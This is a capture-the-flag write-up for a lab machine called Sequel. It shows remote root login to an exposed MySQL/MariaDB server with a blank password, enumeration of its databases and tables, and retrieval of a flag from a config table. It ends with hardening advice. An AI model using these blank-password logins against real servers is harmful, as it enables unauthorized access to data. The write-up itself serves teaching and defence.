# Sequel — CTF Write-up

## Target Information

| Information | Details | 
| ----- | ----- | 
| **Target Service** | MySQL / MariaDB Database | 
| **Default Port** | `3306` | 

## Enumeration

### Remote MySQL Connection

To test for misconfigured or default administrative credentials on the exposed MySQL service, connection attempts were made using the `root` account without a password:

```
mysql -h [IP] -u root -p
mysql -h [IP] -u root --password=''

```

The MySQL service permitted direct remote root login without prompting for a password.

### Database Enumeration

Once authenticated to the MariaDB/MySQL prompt, standard database discovery commands were executed:

```
MariaDB > SHOW DATABASES;
MariaDB > USE [database_name];
MariaDB > SHOW TABLES;
MariaDB > DESCRIBE [table_name];
MariaDB > SELECT * FROM [table_name];

```

## Exploitation

### Enumerating Databases and Tables

Listing all available databases on the target server:

```
MariaDB [(none)]> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.198 sec)

```

Selecting the `htb` database:

```
MariaDB [(none)]> USE htb;
Database changed

```

Listing tables within the `htb` database:

```
MariaDB [htb]> SHOW TABLES;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0.252 sec)

```

### Extracting Data

Inspecting the `users` table:

```
MariaDB [htb]> SELECT * FROM users;
+----+----------+------------------+
| id | username | email            |
+----+----------+------------------+
|  1 | admin    | admin@sequel.htb |
|  2 | lara     | lara@sequel.htb  |
|  3 | sam      | sam@sequel.htb   |
|  4 | mary     | mary@sequel.htb  |
+----+----------+------------------+
4 rows in set (0.185 sec)

```

Checking the schema of the `config` table:

```
MariaDB [htb]> DESCRIBE config;
+-------+---------------------+------+-----+---------+----------------+
| Field | Type                | Null | Key | Default | Extra          |
+-------+---------------------+------+-----+---------+----------------+
| id    | bigint(20) unsigned | NO   | PRI | NULL    | auto_increment |
| name  | text                | YES  |     | NULL    |                |
| value | text                | YES  |     | NULL    |                |
+-------+---------------------+------+-----+---------+----------------+
3 rows in set (0.167 sec)

```

Retrieving all key-value entries from the `config` table:

```
MariaDB [htb]> SELECT * FROM config;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
7 rows in set (0.265 sec)

```

The `flag` parameter inside the `config` table revealed the target flag.

## Flags

### Flag

```
7b4bec00d1a39e3dd4e021ec3d915da8

```

## Lessons Learned

1. **Default Database Credentials:** Always test exposed MySQL instances for blank or default passwords using administrative users like `root`.

2. **Restrict Remote MySQL Access:** Database management systems should not be exposed directly to public/external networks without firewall restrictions or binding to `127.0.0.1`.

3. **Database Security Hardening:** Ensure database accounts enforce strong, unique passwords and follow the principle of least privilege.

## Attack Chain Summary

```
Port 3306 (MySQL/MariaDB) Discovery
  │
  └── Test Remote Root Authentication
          │
          ↓
  Connect using root (Blank Password)
          │
          ↓
  SHOW DATABASES -> USE htb
          │
          ↓
  SHOW TABLES
          │
          ↓
  SELECT * FROM config
          │
          ↓
  Flag Retrieved

```